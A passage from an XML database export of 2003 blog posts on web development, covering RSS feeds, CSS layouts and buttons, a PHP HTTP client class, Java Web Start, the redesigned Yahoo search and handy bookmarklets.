 &lt;li&gt;The &lt;a href=&quot;http://web.resource.org/rss/1.0/spec&quot;&gt;RDF Site Summary (RSS) 1.0&lt;/a&gt; specification.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://feeds.archive.org/validator/&quot;&gt;The invaluable RSS Validator&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.syndic8.com/&quot;&gt;syndic8&lt;/a&gt; has a bunch of articles on RSS.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-04-04 22:05:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">878</field>
		<field name="title">Site moved</field>
		<field name="slug">siteMoved</field>
		<field name="body">&lt;p&gt;I've just finished migrating this site to a new server. Everything &lt;em&gt;seems&lt;/em&gt; to be working, and the site appears to load noticably faster now.&lt;/p&gt;</field>
		<field name="created">2003-04-05 13:33:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">879</field>
		<field name="title">Bill Kearney responds</field>
		<field name="slug">billKearneyResponds</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.syndic8.com/~wkearney/blogs/syndic8/&quot; title=&quot;Syndication News from Bill Kearney&quot;&gt;Bill Kearney&lt;/a&gt; posted &lt;a href=&quot;/archive/2003/04/04/lettingOffSomeSteam#comment8&quot;&gt;this comment&lt;/a&gt; in response to yesterday's &lt;a href=&quot;/archive/2003/04/04/#lettingOffSomeSteam&quot;&gt;semi-rant&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;/archive/2003/04/04/lettingOffSomeSteam#comment8&quot;&gt;&lt;p&gt;
Sure, the trouble is getting the developers of the applications creating the RSS to stop being pigheaded. This is, unfortunately, a non-trivial matter. Several battles have been waged, to varying degrees of success. Fundamentally, there's a faction that naively worries about 'readability' of the XML. Then there's a crowd that worries about the verbosity. Over in another corner is the 'but I want to theoretically be able to use mod_kitchensink in my RSS'. Meanwhile, vendor jockeying with proprietary, half-baked extensions keeps happening, over and over... &lt;/p&gt;

&lt;p&gt;The fortunate thing is diversity. As more tools come online it becomes apparent that giving the users what they want often means switching tools. When one tool doesn't cut it, the users switch. Witness the incredible growth of MovableType. It defaults to creating RSS-1.0 files and makes a lot of use of RDF (via trackbacks). The users never see the gritty details, they just see nice functionality and use it.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;The &lt;a href=&quot;/archive/2003/04/04/lettingOffSomeSteam#comments&quot;&gt;other comments&lt;/a&gt; are well worth reading as well.&lt;/p&gt;</field>
		<field name="created">2003-04-05 13:39:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">880</field>
		<field name="title">Absolute positioning on the wiki</field>
		<field name="slug">absolutePositioningOnTheWiki</field>
		<field name="body">&lt;p&gt;I've put together some notes on &lt;a href=&quot;http://css-discuss.incutio.com/?page=AbsoluteLayouts&quot;&gt;constructing CSS layouts using absolute positioning&lt;/a&gt; over on the css-discuss Wiki. If you have any suggestions or improvements, just make them :)&lt;/p&gt;</field>
		<field name="created">2003-04-05 18:19:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">881</field>
		<field name="title">Applications in Java</field>
		<field name="slug">spacesAndApplicationsInJava</field>
		<field name="body">&lt;p&gt;My opinion of Java as a platform for developing &lt;acronym title=&quot;Graphical User Interface&quot;&gt;GUI&lt;/acronym&gt; applications has generally been that it results in slow, clunky, ugly software that is a pain to install, feels unresponsive and fails to behave in the way I expect a &lt;acronym title=&quot;Graphical User Interface&quot;&gt;GUI&lt;/acronym&gt; to behave. I based this on my experience with Java applets (ugh) and &lt;a href=&quot;http://www.mediasurface.com/&quot;&gt;Mediasurface&lt;/a&gt;, a content management system I had to struggle with for two years working for a dot-bomb in London.&lt;/p&gt;

&lt;p&gt;I've just had my mind opinion reversed by &lt;a href=&quot;http://www.dynamicobjects.com/&quot;&gt;spaces&lt;/a&gt; and Java Web Start. Spaces is a &lt;acronym title=&quot;Personal Information Manager&quot;&gt;PIM&lt;/acronym&gt; of sorts, but stands apart from the rest in that it introduces the concepts of &quot;spaces&quot;, which are abstract entities that group related content together. Content comes in the form of contacts, email, notes, tasks, a calendar and &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; feeds. It's an interesting concept and the implementation is excellent for an alpha release.&lt;/p&gt;

&lt;p&gt;While spaces is interesting, it's not quite good enough for me to switch to it over Evolution. What it has done is shown me that a Java application can be fast, good looking and every bit as usable as a native application. It uses Java's look-and-feel functionality to adapt to the system it is running on, which I had seen in action once or twice before but never really took seriously until now. The author claims that write once run anywhere is no longer a myth, and backs it up with a screenshot of &lt;a href=&quot;http://www.dynamicobjects.com/d2r/archives/001854.html&quot; title=&quot;spaces on OS/2&quot;&gt;spaces running on OS/2&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Installation was handled by Java Web Start, which is a technology I've completely ignored before now. It's very smart - essentially, it integrates with your browser (via a mime-type association) to allow execution and installation of applications with a single click on a link. Spaces weighs in at 2.5MB, so on broadband it took about a minute for it to download. It showed me a certificate, asked for permission to access my hard drive and loaded up the application. Now that it's installed I can execute it through the Java Web Start icon on my desktop (with an option to add a direct shortcut to the start menu - yup, I'm using Windows XP at the moment). It's very slick.&lt;/p&gt;

&lt;p&gt;I'm sorely tempted to give Java another go.&lt;/p&gt;</field>
		<field name="created">2003-04-05 18:45:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">882</field>
		<field name="title">Private wikis for personal organisation</field>
		<field name="slug">privateWikisForPersonalOrganis</field>
		<field name="body">&lt;p&gt;I've been struggling with different methods of staying organised for as long a I can remember, but I think I've finally found something that works. A couple of days ago I set myself up a password protected Wiki (using my own slightly modified version of &lt;a href=&quot;http://tavi.sourceforge.net/&quot;&gt;WikkiTikkiTavi&lt;/a&gt;) to see if a private personal Wiki could help me stay on top of things. It's already proving remarkably useful. I've set up the front page as a to-do list, split in to University, Work and Personal sections. Any tasks which involve writing or developing ideas are wiki words linking to a page where I can develop them further. I've also got a section devoted to things I plan to blog (hence the recent surge in blogging activity), a bunch of links to useful sites and the beginnings of a collection of phone numbers and contact details. I also finally have a good place to keep all of those irritating but essential pieces of information such as my National Insurance number.&lt;/p&gt;

&lt;p&gt;Of course, with the amount of personal data I am now accumulating security is likely to become more of an issue due to the threat of identity theft (I'm not keeping anything truly vital like passwords on there but it's still a consideration). Maybe I should start looking in to https.&lt;/p&gt;</field>
		<field name="created">2003-04-05 18:57:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">883</field>
		<field name="title">Personal web cache</field>
		<field name="slug">personalWebCache</field>
		<field name="body">&lt;p&gt;Jesse Lawrence is also looking to &lt;a href=&quot;http://soniceast.sytes.net/~jalaw/blog/archive/6.php&quot; title=&quot;Rss Aggregator&quot;&gt;implement his own aggregator&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://soniceast.sytes.net/~jalaw/blog/archive/6.php&quot;&gt;&lt;p&gt;
I've been searching high and low for an RSS reader that I'm happy with and that works on Linux, but so far I've been unsuccessful. So, last night I started coding my own. It's going to be more of a personal communication system, though, not just an RSS reader. I want it to have email reading and writing capabilities, and also webpage caching, through the use of javascript bookmarks. This way, when you find a page you like, hit a bookmark, and it gets saved to you system, in a way which makes it easy to find.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I'd been thinking about implementing a personal web proxy (&lt;a href=&quot;http://www.decafbad.com/twiki/bin/view/Main/PersonalWebProxy&quot; title=&quot;PersonalWebProxy aka Agent Frank&quot;&gt;inspired by Les Orchard&lt;/a&gt;) with some kind of interface for telling it to cache the page I last visited but a simple bookmarklet sounds like a much better solution. I don't think I'd want it as part of an aggregator though. &lt;em&gt;Starts tinkering...&lt;/em&gt;&lt;/p&gt;</field>
		<field name="created">2003-04-05 23:50:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">884</field>
		<field name="title">HttpClient PHP class</field>
		<field name="slug">httpClient</field>
		<field name="body">&lt;p&gt;I've been working in quite a roundabout fashion recently. My principle target is to build a collaborative blogging system. As part of this, I needed an &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; aggregator to allow a single blog to show the most recent entries from a number of other, related blogs. Then I needed a way of downloading &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; feeds from external sites. While thinking about this (although to be fair it's pretty much a solved problem) I was inspired to build something that could cache whole sites. And &lt;em&gt;that&lt;/em&gt; lead me to need a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; client class for retriving information from the web. So I wrote one of those :)&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://scripts.incutio.com/httpclient/&quot;&gt;HttpClient&lt;/a&gt; is similar in some ways to &lt;a href=&quot;http://snoopy.sourceforge.net/&quot;&gt;Snoopy&lt;/a&gt; (which I have been using and recommending for years) but takes a different approach and includes some interesting new features. Firstly, while Snoopy contains a bunch of code for parsing &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; (to extract forms, links and the link) HttpClient concentrates purely on the &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; side of things, leaving &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; parsing to other classes. Secondly, HttpClient supports gzip encoding. And finally, HttpClient is designed to be used multiple times in a single session, and will store and resend cookies and referral information between requests.&lt;/p&gt;

&lt;p&gt;The &lt;a href=&quot;http://scripts.incutio.com/httpclient/&quot;&gt;HttpClient site&lt;/a&gt; has &lt;a href=&quot;http://scripts.incutio.com/httpclient/examples.php&quot; title=&quot;HttpClient Examples&quot;&gt;example code&lt;/a&gt;, a &lt;a href=&quot;http://scripts.incutio.com/httpclient/manual.php&quot; title=&quot;HttpClient Manual&quot;&gt;manual&lt;/a&gt; and a &lt;a href=&quot;http://scripts.incutio.com/httpclient/&quot; title=&quot;HttpClient Demo&quot;&gt;demo&lt;/a&gt; which shows the client accessing Amazon.com with debug mode turned on.&lt;/p&gt;

&lt;p&gt;As an aside, I learnt a couple of useful things about &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; while putting the class together, both of them from reading comments in the &lt;a href=&quot;http://www.php.net/manual/en/&quot;&gt;PHP Manual&lt;/a&gt;. Firstly, &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; 1.1 is best avoided from a scripting point of view - it requires support for chunked encoding if you want to avoid random hex added to your content, and provides no practical advantages over &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; 1.0 (cookies / gzip encoding and the all important &lt;code&gt;Host:&lt;/code&gt; header work just fine without it). Secondly, if you want to uncompress gzip encoded content from an &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; response you need to remove the first 10 characters before running the &lt;a href=&quot;http://www.php.net/gzinflate&quot;&gt;&lt;code&gt;gzinflate()&lt;/code&gt;&lt;/a&gt; function or it will fail with a mysterious error.&lt;/p&gt;</field>
		<field name="created">2003-04-06 21:28:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">885</field>
		<field name="title">Lots and lots of CSS buttons</field>
		<field name="slug">lotsAndLotsOfCssButtons</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.antipixel.com/blog/archives/2002/10/22/steal_these_buttons.html&quot; title=&quot;Steal These Buttons&quot;&gt;alternative W3C buttons&lt;/a&gt; on AntiPixel are great. Jamie Zawinsky &lt;a href=&quot;http://www.antipixel.com/blog/archives/2002/10/22/steal_these_buttons.html#jamie_zawinski_000679&quot;&gt;suggested&lt;/a&gt;  recreating them in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. &lt;a href=&quot;http://www.kryogenix.org/days/461.html&quot; title=&quot;Antipixel buttons without images&quot;&gt;Stuart Langridge&lt;/a&gt;, &lt;a href=&quot;http://www.sovavsiti.cz/css/w3c_buttons.html&quot; title=&quot;W3C buttons without images&quot;&gt;Marek Prokop&lt;/a&gt;, &lt;a href=&quot;http://www.frejol.org/archives.live?id=2003040403&quot; title=&quot;Antipixel buttons in HTML/CSS&quot;&gt;Nick Boalch&lt;/a&gt; and &lt;a href=&quot;http://www.meyerweb.com/eric/css/examples/plat-buttons.html&quot; title=&quot;Steal these buttons, too&quot;&gt;Eric Meyer&lt;/a&gt; all had a go. Eric even did the &lt;a href=&quot;http://www.ragingplatypus.com/&quot;&gt;Raging Platypus&lt;/a&gt; ones as well.&lt;/p&gt;</field>
		<field name="created">2003-04-06 22:14:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">886</field>
		<field name="title">Archive woes</field>
		<field name="slug">archiveWoes</field>
		<field name="body">&lt;p&gt;Mike Golding has some &lt;a href=&quot;http://www.notestips.com/80256B3A007F2692/0/84F38B479576AFB480256C930059EBF9&quot;&gt;interesting thoughts&lt;/a&gt; on Archive Navigation in blogs. He uses &lt;a href=&quot;/archive/&quot; title=&quot;Simon Willison: Archive&quot;&gt;mine&lt;/a&gt; as an example of what &lt;em&gt;not&lt;/em&gt; to do. I agree - the archives on this site leave an awful lot to be desired. I've got a few ideas to improve them (mostly inspired by Mark Pilgrim's excellent &lt;a href=&quot;http://diveintomark.org/archives/2003/02/&quot; title=&quot;February 20023 [dive into mark]&quot;&gt;calendar navigation&lt;/a&gt;) but I can't really do anything until I've been through and &lt;a href=&quot;http://simon.incutio.com/archive/2003/03/25/#dateCentricVsEntryCentric&quot; title=&quot;Date Centric vs Entry Centric&quot;&gt;added titles&lt;/a&gt; to every single entry :/&lt;/p&gt;</field>
		<field name="created">2003-04-06 22:40:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">887</field>
		<field name="title">HTMLCleaner class for PHP</field>
		<field name="slug">htmlCleaner</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.phpclasses.org/browse.html/package/1020.html&quot;&gt;htmlcleaner&lt;/a&gt; is a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; class which claims to be able to clean up the revolting &lt;acronym title=&quot;HypreText Markup Language&quot;&gt;HTML&lt;/acronym&gt; generated by Micrsoft's &lt;acronym title=&quot;HypreText Markup Language&quot;&gt;HTML&lt;/acronym&gt; libraries, in particular the one that is used for browser embedded &lt;acronym title=&quot;What You See Is What You Get&quot;&gt;WYSIWYG&lt;/acronym&gt; editors. &lt;a href=&quot;http://www.incutio.com/&quot; title=&quot;Incutio Ltd&quot;&gt;We're&lt;/a&gt; using &lt;acronym title=&quot;HypreText Markup Language&quot;&gt;HTML&lt;/acronym&gt; Tidy for this with excellent results, but for people who can't run &lt;acronym title=&quot;HypreText Markup Language&quot;&gt;HTML&lt;/acronym&gt; Tody this could be a useful solution. Unfortunately the class is hosted on &lt;a href=&quot;http://www.phpclasses.org/&quot;&gt;PHP Classes&lt;/a&gt; which still insists on making you log in for no apparent reason.&lt;/p&gt;</field>
		<field name="created">2003-04-06 22:43:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">888</field>
		<field name="title">UltraEdit and the clipboard</field>
		<field name="slug">ultraEditClipboardShenanigans</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.ultraedit.com/&quot;&gt;UltraEdit&lt;/a&gt; tip (discovered just now): If you keep trying to copy and paste between UltraEdit and other applications and it just doesn't work, the chances are that you've accidentally hit Ctrl + 1 through 9, which is the UltraEdit shortcut for selecting a custom clipboard. Hit Ctrl + 0 to get back to the Windows system clipboard and have everything behave as it should again. I suppose this feature could be useful, but I've got ridiculously fast at hitting Ctrl + Windows Key and typing &quot;notepad&quot; whenever I want to dump my current clipboard contents somewhere temporary without losing it.&lt;/p&gt;</field>
		<field name="created">2003-04-06 22:47:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">889</field>
		<field name="title">Onyx Relicensed</field>
		<field name="slug">onyxRelicensed</field>
		<field name="body">&lt;p&gt;Ed Swindelles has &lt;a href=&quot;http://www.readinged.com/blog/67/&quot; title=&quot;Jump Ship&quot;&gt;relicensed&lt;/a&gt; his &lt;a href=&quot;http://www.readinged.com/onyx/rss/&quot;&gt;Onyx RSS Parser&lt;/a&gt; under the &lt;a href=&quot;http://www.opensource.org/licenses/mit-license.php&quot;&gt;MIT License&lt;/a&gt;, meaning it can now be used without risk for building commercial software. I haven't decided which license to place &lt;a href=&quot;http://scripts.incutio.com/httpclient/&quot;&gt;HttpClient&lt;/a&gt; under, but that one looks like a pretty good bet. I'll work it out in the morning.&lt;/p&gt;</field>
		<field name="created">2003-04-06 23:25:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">890</field>
		<field name="title">getNodesByType()</field>
		<field name="slug">getNodesByType</field>
		<field name="body">&lt;p&gt;On gazingus.org, &lt;a href=&quot;http://www.gazingus.org/js/?id=111&quot;&gt;Flexible Node Retrieval&lt;/a&gt; introduces a new addition to the getElementsBy* family of javascript functions, &lt;code&gt;getNodesByType&lt;/code&gt;. This general purpose function uses a callback function to &quot;filter&quot; the child nodes of a &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; element. It works a bit like &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s &lt;a href=&quot;http://www.php.net/array_fulter&quot;&gt;&lt;code&gt;array_filter&lt;/code&gt;&lt;/a&gt; function. One for the toolbox.&lt;/p&gt;</field>
		<field name="created">2003-04-07 13:25:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">891</field>
		<field name="title">Free Mike Hawash</field>
		<field name="slug">freeMikeHawash</field>
		<field name="body">&lt;p&gt;I thought the US was meant to be the &lt;a href=&quot;http://www.freemikehawash.org/oldindex.html&quot; title=&quot;Free Mike Hawash&quot;&gt;land of the free&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-07 16:17:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">892</field>
		<field name="title">A new Yahoo</field>
		<field name="slug">aNewYahoo</field>
		<field name="body">&lt;p&gt;New York Times: &lt;a href=&quot;http://www.nytimes.com/2003/04/07/technology/07YAHO.html?ex=1050292800&amp;amp;en=821ae8a3ad2b7af3&amp;amp;ei=5062&amp;amp;partner=GOOGLE&quot;&gt;Yahoo Plans Improvements in Effort to Regain Lost Ground&lt;/a&gt;. I'm guessing &lt;a href=&quot;http://new.search.yahoo.com/&quot; title=&quot;Uncluttered Yahoo interface&quot;&gt;this&lt;/a&gt; is what it's going to look like (via &lt;a href=&quot;http://lists.evolt.org/&quot;&gt;thelist&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2003-04-07 18:25:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">893</field>
		<field name="title">More on the new Yahoo</field>
		<field name="slug">moreOnTheNewYahoo</field>
		<field name="body">&lt;p&gt;Unsurprisingly, the &lt;a href=&quot;http://new.search.yahoo.com/&quot;&gt;new Yahoo&lt;/a&gt; is generating a whole load of commentary. There's a good thread going on &lt;a href=&quot;http://www.37signals.com/svn/archives/000146.php&quot; title=&quot;New Yahoo vs. Old Google&quot;&gt;Signals vs Noise&lt;/a&gt;, and &lt;a href=&quot;http://iaslash.org/node.php?id=7325&quot; title=&quot;New Yahoo! Search debuts&quot;&gt;ia/&lt;/a&gt; has coverage as well. I've been playing with it a bit and it's definitely an immense improvement on the current Yahoo, although it's still not quite as usable or responsive as Google. I also noticed that the search results are &lt;em&gt;exactly&lt;/em&gt; the same as Google's (even for image search) so it looks like Yahoo haven't switched over to Inktomi just yet.&lt;/p&gt;

&lt;p&gt;It's worth clicking through the &lt;a href=&quot;http://search.yahoo.com/tour&quot;&gt;tour&lt;/a&gt; to get an overview of the new interface. The &quot;open in new window&quot; icon for each search result is a clever addition, but the smartest feature in my opinion are the specialised Yahoo shortcuts. &lt;samp&gt;mail!&lt;/samp&gt; takes you to Yahoo mail, &lt;samp&gt;calendar!&lt;/samp&gt; to Yahoo calendar and &lt;a href=&quot;http://search.yahoo.com/new_search_tour/yahoolist.html&quot; title=&quot;Full list of Yahoo shortcuts&quot;&gt;so on&lt;/a&gt;. It looks like are Yahoo hoping to out do Google by capitalising on their many other services, which seems like a very sensible approach.&lt;/p&gt;</field>
		<field name="created">2003-04-07 21:47:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">894</field>
		<field name="title">Hydra: Collaborative text editing</field>
		<field name="slug">collaborativeEditing</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://afongen.com/blog/archives/000434.php#000434&quot; title=&quot;Hydra&quot;&gt;Sam Buchanan&lt;/a&gt;, &lt;a href=&quot;http://hydra.globalse.org/&quot;&gt;Hydra&lt;/a&gt; is a remarkably innovative text editor that allows multiple users, via a network, to edit the same document at the same time and have it update live on each other's screens. This &lt;a href=&quot;http://hydra.globalse.org/screenshot-extremeprogramming.jpg&quot; title=&quot;Using Hydra for extreme programming&quot;&gt;screenshot&lt;/a&gt; probably demonstrates it best, showing multiple participants working on the same code simultaneously. The colour coding (where each person's edits shows up in a different colour) is a particularly nice touch. Unfortunately, Hydra is only available for Mac OS X so I can't try it out myself. Hopefully they'll &lt;a href=&quot;http://hydra.globalse.org/faq.html&quot; title=&quot;Did you think about releasing Hydra as OpenSource?&quot;&gt;release the code&lt;/a&gt; at some point and let aspiring Windows / Unix hackers try and port it to their respective platforms.&lt;/p&gt;</field>
		<field name="created">2003-04-08 10:00:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">895</field>
		<field name="title">Accessible Python</field>
		<field name="slug">accessiblePython</field>
		<field name="body">&lt;p&gt;A &lt;a href=&quot;http://www.pyzine.com/archives.phtml?a=000194&amp;amp;b=2&quot;&gt;post&lt;/a&gt; on Bryan Richard's blog about &lt;a href=&quot;http://safari.oreilly.com/&quot;&gt;Safari&lt;/a&gt; leads to a query about whether or not &lt;a href=&quot;http://www.pyzine.com/&quot;&gt;Py&lt;/a&gt; (a Python print magazine) should move to &lt;acronym title=&quot;Portable Document Format&quot;&gt;PDF&lt;/acronym&gt;, which in turn leads to a fascinating discussion about the accessibility of both websites and Python source code itself. Well worth taking the time to read.&lt;/p&gt;</field>
		<field name="created">2003-04-08 13:13:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">896</field>
		<field name="title">LiveHTTPHeaders</field>
		<field name="slug">liveHTTPHeaders</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://afongen.com/blog/archives/000435.php#000435&quot; title=&quot;More Mozilla goodness.&quot;&gt;Sam Buchanan&lt;/a&gt;, Daniel Savard's incredibly useful &lt;a href=&quot;http://livehttpheaders.mozdev.org/&quot;&gt;LiveHTTPHeaders&lt;/a&gt; addon for Mozilla and Phoenix. It adds an extra tab to the Page Info dialog with the full &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; headers sent with the page, and also adds a &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; Headers tool to the Tools menu which can be used to watch and debug &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; requests in real time. I wish I'd known about this when I was developing &lt;a href=&quot;http://scripts.incutio.com/httpclient/&quot;&gt;HttpClient&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Incidentally, check out the headers on &lt;a href=&quot;http://slashdot.org/&quot;&gt;Slashdot&lt;/a&gt; for a particularly geeky in-joke ;)&lt;/p&gt;</field>
		<field name="created">2003-04-08 17:48:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">897</field>
		<field name="title">The Buzz</field>
		<field name="slug">theBuzz</field>
		<field name="body">&lt;p&gt;Russell Beattie &lt;a href=&quot;http://www.russellbeattie.com/notebook/20030407.html#222716&quot; title=&quot;The Buzz&quot;&gt;rants with zealot passion&lt;/a&gt; about how next generation mobile phones will &lt;q cite=&quot;http://www.russellbeattie.com/notebook/20030407.html#222716&quot;&gt;change the way we live&lt;/q&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.russellbeattie.com/notebook/20030407.html#222716&quot;&gt;&lt;p&gt;Like the mid 1990s when suddenly you could easily use the internet for the first time to look up timely information - say medical information or shopping comparsions for cars - at first it seemed incredible, now 90+ percent of new car buyers start on the web. It's now become a part of how we all live. We've been waiting for the past few years for another technical revolution of similar proportions. An enabling technology that will seem interesting, fun and new at first, but then soon become vital to our every day lives. Well it's arrived...&lt;/p&gt;

&lt;p&gt;It's about anywhere/anytime communication and access to the information that you need. Life itself is about communication: we talk to, we listen to, we read about, we watch other people every day all day. It's why we get up in the morning. Suddenly we're going to be able to communicate in new and varied ways: via voice, email, chat, images and video instantly and receive the same all in return. And we're going to LOVE it. But as a bonus, suddenly you can access information where and when you need it as well: &quot;What time's that movie? Where are we? How do we get there? Do our friends want to come? I better buy tickets now...&quot; The combination of the two is a powerful package and soon you won't be able to remember what it was like to have to boot your computer just to browse the web or send an email or chat or play games.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-04-08 17:56:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">898</field>
		<field name="title">Category specific RSS feeds</field>
		<field name="slug">categorySpecificRssFeeds</field>
		<field name="body">&lt;p&gt;I frequently check the &lt;a href=&quot;http://mechanicalcat.net/pyblagg.html&quot;&gt;Python Programmer Weblogs&lt;/a&gt; page for an addition to my daily blogging fix. It's a simple but very effective idea: Subscribe an aggregator to a bunch of feeds about a similar topic and publish the results for all to see. I'm one of the more prolific bloggers of the ones listed there, and since I tend to post a whole bunch of entries in a relatively narrow timeframe my stuff often appears in a big lump on the front page of the site. I've been feeling slightly guilty about this, as most of my posts have nothing to do with Python at all. So I've finally got my act together and knocked out &lt;a href=&quot;http://simon.incutio.com/categories/&quot;&gt;RSS feeds for individual blog categories&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The Python Programmer Weblogs script apparently scrapes &lt;a href=&quot;http://lowlife.jp/cgi-bin/moin.cgi/PythonProgrammersWeblog&quot; title=&quot;PythonProgrammersWeblog&quot;&gt;this wiki page&lt;/a&gt; for feed information, so I've updated the link on there to my RSS feed.&lt;/p&gt;

</field>
		<field name="created">2003-04-08 21:59:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">899</field>
		<field name="title">XHTML Tips</field>
		<field name="slug">xhtmlTips</field>
		<field name="body">&lt;p&gt;Via the &lt;a href=&quot;http://groups.yahoo.com/group/XHTML-L/message/4050&quot; title=&quot;XHTML-L: old tips&quot;&gt;XHTML-L mailing list&lt;/a&gt;, Simon St.Laurent's &lt;a href=&quot;http://simonstl.com/tips/archive/category.html&quot;&gt;XHTML tips archive&lt;/a&gt;. An abundance of useful &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; related information.&lt;/p&gt;</field>
		<field name="created">2003-04-08 22:17:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">900</field>
		<field name="title">The best bookmarklets on the web</field>
		<field name="slug">funkyBookmarklets</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.meyerweb.com/eric/thoughts/2003b.html#t20030408&quot; title=&quot;So Square It&amp;apos;s Hip&quot;&gt;Eric Meyer&lt;/a&gt;, the &lt;a href=&quot;http://www.squarefree.com/bookmarklets/&quot; title=&quot;Jesse&amp;apos;s Bookmarklets Site&quot;&gt;best bookmarklets collection&lt;/a&gt; on the web. Make a bee line for the &lt;a href=&quot;http://www.squarefree.com/bookmarklets/webdevel.html&quot;&gt;Web Development Bookmarklets&lt;/a&gt; and grab &lt;code&gt;test styles&lt;/code&gt; and &lt;code&gt;shell&lt;/code&gt; (both Netscape / Mozilla only) - shell brings up a javascript console shell which can actively modify the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; of the current page, while &lt;code&gt;test styles&lt;/code&gt; (easily the most useful bookmarklet I've ever used) allows you to make &lt;em&gt;live&lt;/em&gt;, dynamic changes to the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; currently affecting the document. You type &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; statements and as soon as they are complete enough to be parsed they are applied to the current page. The other bookmarklets are well worth a look as well, especially &lt;code&gt;ancestors&lt;/code&gt; which displays the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; selector hierarchy of the element under your mouse pointer in the browser's status bar.&lt;/p&gt;</field>
		<field name="created">2003-04-09 11:36:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">901</field>
		<field name="title">Half Hour Redesign</field>
		<field name="slug">halfHourRedesign</field>
		<field name="body">&lt;p&gt;Redesigned. &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; changes only, took less than half an hour thanks to the &lt;a href=&quot;http://www.squarefree.com/bookmarklets/&quot; title=&quot;Web Development Bookmarklets&quot;&gt;zap style sheets, test styles and ancestors bookmarklets&lt;/a&gt;. I'm feeling orange :)&lt;/p&gt;

